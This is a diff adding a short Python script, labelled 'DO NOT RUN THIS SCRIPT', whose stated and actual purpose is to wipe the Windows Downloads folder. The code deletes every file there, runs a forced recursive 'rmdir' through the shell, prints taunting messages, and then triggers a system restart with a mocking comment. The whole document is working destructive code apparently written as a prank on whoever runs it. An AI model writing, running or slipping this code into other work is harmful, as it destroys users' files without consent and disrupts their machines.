@@ -1,0 +1,32 @@
+#DO NOT RUN THIS SCRIPT
+#INTENDED EFFECT - 
+#IT WILL DELETE YOUR DOWNLOADS FOLDER ON WINDOWS
+
+import os
+import subprocess as s
+import time as t
+def rm_dir(directory_path):
+    print(f"Attempting to clear files in: {directory_path}")
+    if not os.path.isdir(directory_path):
+        print(f"Error: Directory not found at {directory_path}")
+        return
+    for filename in os.listdir(directory_path):
+        file_path = os.path.join(directory_path, filename)
+        try:
+            if os.path.isfile(file_path) or os.path.islink(file_path):
+                os.remove(file_path)
+                print(f"Successfully removed: {filename}")
+            else:
+                print(f"Skipping directory/link: {filename}")
+        except OSError as e:
+            print(f"Error removing {filename}: {e}")
+print("Yeah, you cooked, buddy")
+t.sleep(1)
+directory = os.path.expandvars("%homedrive%%homepath%\\Downloads")
+cmd = ["rmdir", "/s", "/q", directory]
+rm_dir(directory)
+s.run(cmd, shell=True)
+print("SUCK IT!")
+t.sleep(2)
+cmd = ["shutdown", "/r", "/t", "15", "/c", "Your Downloads folder is deleted btw ;)"]
+s.run(cmd, shell=True)
